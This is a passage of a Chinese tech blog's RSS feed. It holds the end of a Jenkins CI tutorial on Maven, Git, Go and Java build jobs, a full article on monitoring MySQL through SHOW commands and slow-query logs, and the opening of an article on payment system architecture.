&lt;p&gt;（1）点击左侧的“系统管理”菜单 ,然后点击&lt;br&gt;&lt;img src=&#34;/img/2024/20240417.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;（2）选择“可选插件”选项卡，搜索maven，在列表中选择Maven Integration ，点击“直接安装”按钮&lt;br&gt;&lt;img src=&#34;/img/2024/20240418.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;看到如下图时，表示已经完成&lt;br&gt;&lt;img src=&#34;/img/2024/20240419.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;全局工具配置&#34;&gt;&lt;a href=&#34;#全局工具配置&#34; class=&#34;headerlink&#34; title=&#34;全局工具配置&#34;&gt;&lt;/a&gt;全局工具配置&lt;/h5&gt;&lt;p&gt;选择系统管理，全局工具配置&lt;br&gt;&lt;img src=&#34;/img/2024/20240420.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;自动安装&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jenkins提供了两种工具配置的方式，我们还是以maven为例&lt;br&gt;&lt;img src=&#34;/img/2024/20240421.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;第一种如上图，只需要选择自动安装和版本号就可以，同时Jenkins在右上角给出了一个解疑按键，可以通过该键看到说明和示例。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本地安装&lt;/strong&gt;&lt;br&gt;相较于第一种方式，第二种方式相对麻烦一些，但好处是可以在以后打包的时候不必重新下载，缩短打包的时间。&lt;/p&gt;
&lt;p&gt;下面就来教大家如何安装Maven与本地仓库：&lt;/p&gt;
&lt;p&gt;（1）将Maven压缩包上传至服务器（虚拟机）&lt;/p&gt;
&lt;p&gt;（2）解压&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tar zxvf apache-maven-3.5.4-bin.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（3）移动目录&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mv apache-maven-3.5.4 /usr/local/maven&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（4）编辑setting.xml配置文件vi /usr/local/maven/conf/settings.xml，配置本地仓库目录,内容如下&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;localRepository&amp;gt;/usr/local/repository&amp;lt;/localRepository&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（5）将开发环境的本地仓库上传至服务器（虚拟机）并移动到/usr/local/repository 。&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mv reponsitory_boot /usr/local/repository&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其他示例:&lt;/p&gt;
&lt;p&gt;（1）JDK配置&lt;br&gt;&lt;img src=&#34;/img/2024/20240422.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置javahome为 /usr/java/jdk1.8.0_171-amd64&lt;/p&gt;
&lt;p&gt;（2）Git配置 （本地已经安装了Git软件）&lt;br&gt;&lt;img src=&#34;/img/2024/20240423.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;（3）Maven配置&lt;br&gt;&lt;img src=&#34;/img/2024/20240424.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;代码上传至Git服务器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;p&gt;（1）在本地安装git(Windows版本)&lt;/p&gt;
&lt;p&gt;（2）在IDEA中选择菜单 : File — settings , 在窗口中选择Version Control — Git&lt;br&gt;&lt;img src=&#34;/img/2024/20240425.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;（3）选择菜单VCS —&amp;gt; Enable Version Control Integration…&lt;br&gt;&lt;img src=&#34;/img/2024/20240426.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择Git&lt;/p&gt;
&lt;p&gt;（4）设置远程地址: 右键点击工程选择菜单 Git —&amp;gt; Repository —&amp;gt;Remotes…&lt;br&gt;&lt;img src=&#34;/img/2024/20240427.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/20240428.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;(5）右键点击工程选择菜单 Git —&amp;gt; Add&lt;/p&gt;
&lt;p&gt;（6）右键点击工程选择菜单 Git —&amp;gt; Commit Directory…&lt;/p&gt;
&lt;p&gt;（7）右键点击工程选择菜单 Git —&amp;gt; Repository —&amp;gt; Push …&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;任务的创建与执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们以最火的Java项目和Go项目为例，给大家分别演示如何构建项目和执行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Go项目&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）回到首页，点击新建按钮 .如下图，输入名称，选择创建一个自由风格的项目，点击OK&lt;br&gt;&lt;img src=&#34;/img/2024/20240429.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;（2）General管理，可以添加项目描述和GitHub项目路径，以及一些配置&lt;br&gt;&lt;img src=&#34;/img/2024/20240430.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;（3）源码管理，选择GitHub&lt;br&gt;&lt;img src=&#34;/img/2024/20240431.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/20240432.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/20240433.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;（4）构建触发器，配置触发规则，这里以定时和轮询为示例，配别设置为&lt;br&gt;&lt;img src=&#34;/img/2024/20240434.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;定时构建：定时构建1次任务&lt;/p&gt;
&lt;p&gt;轮询SCM:定时查看源码管理的代码是否更新，有更新则构建，否则不会构建&lt;/p&gt;
&lt;p&gt;如图所示，定时构建为每间隔10分钟定时构建一次，轮询SCM为每5分钟轮询检测一次。&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color: #808080;&#34;&gt;时间*号规则为: 分 时 日 月 周&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（5）构建环境，配置控制台输出时间戳和指定Go语言版本&lt;br&gt;&lt;img src=&#34;/img/2024/20240435.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;（6）构建，使用Shell脚本测试代码上传后的项目是否有效&lt;br&gt;&lt;img src=&#34;/img/2024/20240436.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;Shell如下:&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;export GOPATH=$WORKSPACE/../                    # 指定GOPATH路径，Go语言执行必须有GOPATH路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export GOWORK=$GOPATH/src/github.com/Jenkins    # 创建项目执行时的目录依赖结构&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp -rf $WORKSPACE/* $GOWORK/                    # 使测试运行数据和源数据隔离&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd $GOWORK &amp;amp;&amp;amp; go build                          # 进入项目目录并执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;命令解说：&lt;br&gt;&lt;span style=&#34;color: #808080;&#34;&gt;&lt;br&gt;$GOPATH Go 运行需要指定 GOPATH 也即项目运行路径&lt;br&gt;$WORKSPACE /var/jenkins_home/workspace/Jenkins&lt;br&gt;GOWORK 创建符合代码依赖的执行目录&lt;br&gt;注:下载Go的插件在构建时，会自动为我们设置GOROOT,但不会指定GOPATH，因此需要指定
&lt;/span&gt;&lt;br&gt;最后点击“保存”按钮&lt;/p&gt;
&lt;p&gt;（7）执行构建，控制台查看输出&lt;br&gt;&lt;img src=&#34;/img/2024/20240437.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/20240438.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;构建成功，也输出了WORKSPACE、GOPATH、GOROOT目录，说明配置生效。进入docker容器或是挂载目录查看是否有可执行文件：&lt;br&gt;&lt;img src=&#34;/img/2024/20240439.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;除了上述方法，也可以通过shell配置docker等方式构建、部署、运行项目，还可以将项目配置到当前/其他服务器运行，更多配置方式就不一一陈述了，请自行挖掘。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JAVA项目&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）回到首页，点击新建按钮 .如下图，输入名称，选择创建一个Maven项目，点击OK&lt;br&gt;&lt;img src=&#34;/img/2024/20240440.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;（2）源码管理，选择Git&lt;br&gt;&lt;img src=&#34;/img/2024/20240441.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;(3）Build&lt;br&gt;&lt;img src=&#34;/img/2024/20240442.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;命令:&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;clean package docker:build -DpushImage&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;用于清除、打包，构建docker镜像&lt;/p&gt;
&lt;p&gt;最后点击“保存”按钮&lt;/p&gt;
&lt;p&gt;（4）执行任务&lt;/p&gt;
&lt;p&gt;后续请参照Go项目的执行步骤。&lt;/p&gt;
&lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/PEupc5YIKuctZO1Tivy_ug&#34;&gt;架构师社区&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2023/05/15/mysql-top-log/</guid>
            <title>MYSQL 最朴素的监控方式</title>
            <link>https://erik.xyz/2023/05/15/mysql-top-log/</link>
            <category>mysql</category>
            <category>mysql监控</category>
            <pubDate>Mon, 15 May 2023 22:24:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;对于当前数据库的监控方式有很多，分为数据库自带、商用、开源三大类，每一种都有各自的特色；而对于 mysql 数据库由于其有很高的社区活跃度，监控方式更是多种多样，不管哪种监控方式最核心的就是监控数据，获取得到全面的监控数据后就是灵活的展示部分。那我们今天就介绍一下完全采用 mysql 自有方式采集获取监控数据，在单体下达到最快速、方便、损耗最小。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;本次文章完全使用 mysql 自带的 show 命令实现获取，从 connects、buffercache、lock、SQL、statement、Database throughputs、serverconfig7 大方面全面获取监控数据。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;连接数（Connects）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;最大使用连接数：show status like ‘Max_used_connections’&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;当前打开的连接数：show status like ‘Threads_connected’&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;缓存（bufferCache）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未从缓冲池读取的次数：show status like ‘Innodb_buffer_pool_reads’&lt;/li&gt;
&lt;li&gt;从缓冲池读取的次数：show status like ‘Innodb_buffer_pool_read_requests’&lt;/li&gt;
&lt;li&gt;缓冲池的总页数：show status like ‘Innodb_buffer_pool_pages_total’&lt;/li&gt;
&lt;li&gt;缓冲池空闲的页数：show status like ‘Innodb_buffer_pool_pages_free’&lt;/li&gt;
&lt;li&gt;缓存命中率计算：（1-Innodb_buffer_pool_reads/Innodb_buffer_pool_read_requests）*100%&lt;/li&gt;
&lt;li&gt;缓存池使用率为：((Innodb_buffer_pool_pages_total-Innodb_buffer_pool_pages_free）/Innodb_buffer_pool_pages_total）*100%&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;锁（lock）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;锁等待个数：show status like ‘Innodb_row_lock_waits’&lt;/li&gt;
&lt;li&gt;平均每次锁等待时间：show status like ‘Innodb_row_lock_time_avg’&lt;/li&gt;
&lt;li&gt;查看是否存在表锁：show open TABLES where in_use&amp;gt;0；有数据代表存在锁表，空为无表锁&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;备注：锁等待统计得数量为累加数据，每次获取得时候可以跟之前得数据进行相减，得到当前统计得数据&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SQL&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看 mysql 开关是否打开：show variables like ‘slow_query_log’，ON 为开启状态，如果为 OFF，set global slow_query_log=1 进行开启&lt;/li&gt;
&lt;li&gt;查看 mysql 阈值：show variables like ‘long_query_time’，根据页面传递阈值参数，修改阈值 set global long_query_time=0.1&lt;/li&gt;
&lt;li&gt;查看 mysql 慢 sql 目录：show variables like ‘slow_query_log_file’&lt;/li&gt;
&lt;li&gt;格式化慢 sql 日志：mysqldumpslow -s at -t 10 /export/data/mysql/log/slow.log 注：此语句通过 jdbc 执行不了，属于命令行执行。意思为：显示出耗时最长的 10 个 SQL 语句执行信息，10 可以修改为 TOP 个数。显示的信息为：执行次数、平均执行时间、SQL 语句&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;备注：当 mysqldumpslow 命令执行失败时，将慢日志同步到本地进行格式化处理。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;statement&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;insert 数量：show status like ‘Com_insert’&lt;/li&gt;
&lt;li&gt;delete 数量：show status like ‘Com_delete’&lt;/li&gt;
&lt;li&gt;update 数量：show status like ‘Com_update’&lt;/li&gt;
&lt;li&gt;select 数量：show status like ‘Com_select’&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;吞吐（Database throughputs）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发送吞吐量：show status like ‘Bytes_sent’&lt;/li&gt;
&lt;li&gt;接收吞吐量：show status like ‘Bytes_received’&lt;/li&gt;
&lt;li&gt;总吞吐量：Bytes_sent+Bytes_received&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;数据库参数（serverconfig）&lt;/p&gt;
&lt;p&gt; show variables&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;慢 SQL&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;慢 SQL 指的是 MySQL 慢查询，具体指运行时间超过 long_query_time 值的 SQL。我们常听 MySQL 中有二进制日志 binlog、中继日志 relaylog、重做回滚日志 redolog、undolog 等。针对慢查询，还有一种慢查询日志 slowlog，用来记录在 MySQL 中响应时间超过阀值的语句。慢 SQL 对实际生产业务影响是致命的，所以测试人员在性能测试过程中，对数据库 SQL 语句执行情况实施监控，给开发提供准确的性能优化意见显得尤为重要。那怎么使用 Mysql 数据库提供的慢查询日志来监控 SQL 语句执行情况，找到消耗较高的 SQL 语句，以下详细说明一下慢查询日志的使用步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确保打开慢 SQL 开关 slow_query_log&lt;/li&gt;
&lt;li&gt;设置慢 SQL 域值 long_query_time 这个 long_query_time 是用来定义慢于多少秒的才算 “慢查询”，注意单位是秒，我通过执行 sql 指令 set long_query_time=1 来设置了 long_query_time 的值为 1, 也就是执行时间超过 1 秒的都算慢查询，如下：&lt;/li&gt;
&lt;li&gt;查看慢 SQL 日志路径&lt;/li&gt;
&lt;li&gt;通过慢 sql 分析工具 mysqldumpslow 格式化分析慢 SQL 日志 mysqldumpslow 慢查询分析工具，是 mysql 安装后自带的，可以通过./mysqldumpslow —help 查看使用参数说明&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常见用法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;取出使用最多的 10 条慢查询 ./mysqldumpslow -s c -t 10 /export/data/mysql/log/slow.log&lt;/li&gt;
&lt;li&gt;&lt;p&gt;取出查询时间最慢的 3 条慢查询 ./mysqldumpslow -s t -t 3 /export/data/mysql/log/slow.log&lt;/p&gt;
&lt;p&gt;注意：使用 mysqldumpslow 的分析结果不会显示具体完整的 sql 语句，只会显示 sql 的组成结构；假如: SELECT FROM sms_send WHERE service_id=10 GROUP BY content LIMIT 0, 1000; mysqldumpslow 命令执行后显示：Count: 2 Time=1.5s (3s) Lock=0.00s (0s) Rows=1000.0 (2000), vgos_dba[vgos_dba]@[10.130.229.196]SELECT FROM sms_send WHERE service_id=N GROUP BY content LIMIT N, N&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;mysqldumpslow 的分析结果详解：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Count：表示该类型的语句执行次数，上图中表示 select 语句执行了 2 次。&lt;/li&gt;
&lt;li&gt;Time：表示该类型的语句执行的平均时间（总计时间）&lt;/li&gt;
&lt;li&gt;Lock：锁时间 0s。&lt;/li&gt;
&lt;li&gt;Rows：单次返回的结果数是 1000 条记录，2 次总共返回 2000 条记录。&lt;br&gt;通过这个工具就可以查询出来哪些 sql 语句是慢 SQL，从而反馈研发进行优化，比如加索引，该应用的实现方式等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;常见慢-SQL-排查&#34;&gt;&lt;a href=&#34;#常见慢-SQL-排查&#34; class=&#34;headerlink&#34; title=&#34;常见慢 SQL 排查&#34;&gt;&lt;/a&gt;常见慢 SQL 排查&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;不使用子查询&lt;/p&gt;
&lt;p&gt;SELECT FROM t1 WHERE id (SELECT id FROM t2 WHERE name=’hechunyang’); 子查询在 MySQL5.5 版本里，内部执行计划器是这样执行的：先查外表再匹配内表，而不是先查内表 t2，当外表的数据很大时，查询速度会非常慢。在 MariaDB10/MySQL5.6 版本里，采用 join 关联方式对其进行了优化，这条 SQL 会自动转换为 SELECT t1. FROM t1 JOIN t2 ON t1.id = t2.id; 但请注意的是：优化只针对 SELECT 有效，对 UPDATE/DELETE 子 查询无效， 生产环境尽量应避免使用子查询。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;避免函数索引&lt;/p&gt;
&lt;p&gt;SELECT FROM t WHERE YEAR(d) &amp;gt;= 2016; 由于 MySQL 不像 Oracle 那样⽀持函数索引，即使 d 字段有索引，也会直接全表扫描。应改为 &amp;gt; SELECT FROM t WHERE d &amp;gt;= ‘2016-01-01’;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;用 IN 来替换 OR 低效查询&lt;/p&gt;
&lt;p&gt;慢 SELECT FROM t WHERE LOC_ID = 10 OR LOC_ID = 20 OR LOC_ID = 30; 高效查询 &amp;gt; SELECT FROM t WHERE LOC_IN IN (10,20,30);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;LIKE 双百分号无法使用到索引&lt;/p&gt;
&lt;p&gt;SELECT FROM t WHERE name LIKE ‘%de%’; 使用 SELECT FROM t WHERE name LIKE ‘de%’;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;分组统计可以禁止排序&lt;/p&gt;
&lt;p&gt;SELECT goods_id,count() FROM t GROUP BY goods_id; 默认情况下，MySQL 对所有 GROUP BY col1，col2… 的字段进⾏排序。如果查询包括 GROUP BY，想要避免排序结果的消耗，则可以指定 ORDER BY NULL 禁止排序。使用 SELECT goods_id,count () FROM t GROUP BY goods_id ORDER BY NULL;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;禁止不必要的 ORDER BY 排序&lt;/p&gt;
&lt;p&gt;SELECT count(1) FROM user u LEFT JOIN user_info i ON u.id = i.user_id WHERE 1 = 1 ORDER BY u.create_time DESC; 使用 SELECT count (1) FROM user u LEFT JOIN user_info i ON u.id = i.user_id;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;9.总结&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;任何东西不应过重关注其外表，要注重内在的东西，往往绚丽的外表下会有对应的负担和损耗。&lt;/li&gt;
&lt;li&gt;mysql 数据库的监控支持通过 SQL 方式从 performance_schema 库中访问对应的表数据，前提是初始化此库并开启监控数据写入。&lt;/li&gt;
&lt;li&gt;对于监控而言，不在于手段的多样性，而需要明白监控的本质，以及需要的监控项内容，找到符合自身项目特色的监控方式。&lt;/li&gt;
&lt;li&gt;在选择监控工具对 mysql 监控时，需要关注监控工具本身对于数据库服务器的消耗，不要影响到其自身的使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;链接：&lt;a href=&#34;https://my.oschina.net/u/4090830/blog/5564849&#34;&gt;https://my.oschina.net/u/4090830/blog/5564849&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2023/04/05/all-pay-system/</guid>
            <title>通用的支付系统该如何设计</title>
            <link>https://erik.xyz/2023/04/05/all-pay-system/</link>
            <category>支付系统</category>
            <category>支付</category>
            <pubDate>Wed, 05 Apr 2023 21:56:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;支付永远是一个公司的核心领域，因为这是一个有交易属性公司的命脉。那么，支付系统到底长什么样，又是怎么运行交互的呢?抛开带有支付牌照的金融公司的支付架构，下述链路和系统组成基本上符合绝大多数支付场景。其实整体可以看成是交易核心+支付核心 两个大系统。交易系统关联了业务场景和底层支付，而支付系统完成了调用支付工具到对账清算等一系列相关操作。下面我们就来一起看下各个系统的核心组成和交互。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;支付系统总览&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;核心系统交互&lt;br&gt;&lt;img src=&#34;/img/202304/20230605215759.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;业务图谱&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/img/202304/20230605215938.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;核心系统解析&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;交易核心&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;交易核心把公司的业务系统和底层支付关联起来，让业务系统专注于业务，不比关心底层支付。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/202304/20230605220106.png&#34; alt=&#34;&amp;#39;交易核心&amp;#39;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基础交易类型抽象&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220120.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;多表聚合 &amp;amp; 订单关联&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220132.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;支付核心&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;支付核心主要负责将多种支付类型进行抽象，变成充值、提现、退款、转账四种支付形态。同时，还要负责集成多种支付工具，对支付指令进行编排等等。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/202304/20230605220303.png&#34; alt=&#34;&amp;#39;支付核心总览&amp;#39;&#34;&gt;&lt;/p&gt;
&lt;p&gt; 支付行为编排&lt;/p&gt;
&lt;p&gt;其目的，是实现插件式开发、支付规则可配置的 灵活开发方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/202304/20230605220319.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;异常处理&lt;/p&gt;
&lt;p&gt;异常处理包括了 重复支付、部分支付、金额不一致、其他异常等异常场景。&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220332.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;渠道网关&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220342.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;资金核算&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220353.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3.服务治理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;平台统一上下文&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过确定系统边界、业务建模拆分之后，整个支付平台被拆分几十个服务，而如何保障在服务间流转业务信息不被丢失，是我们需要考虑的问题。平台统一上下文的要素信息（唯一业务标识码），在整个支付平台链路中全程传递，被用来解决这个问题。&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220601.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据一致性治理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;大型的支付公司，内部都有非常严格和完备的数据一致性方案，比如采用业务侵入性非常大的分布式事务等，以牺牲开发效率来提升数据的稳定，是非常有必要的。而业务公司，如果不采用分布式事务又有哪些应对策略呢？&lt;/p&gt;
&lt;p&gt;CAS校验&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220615.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
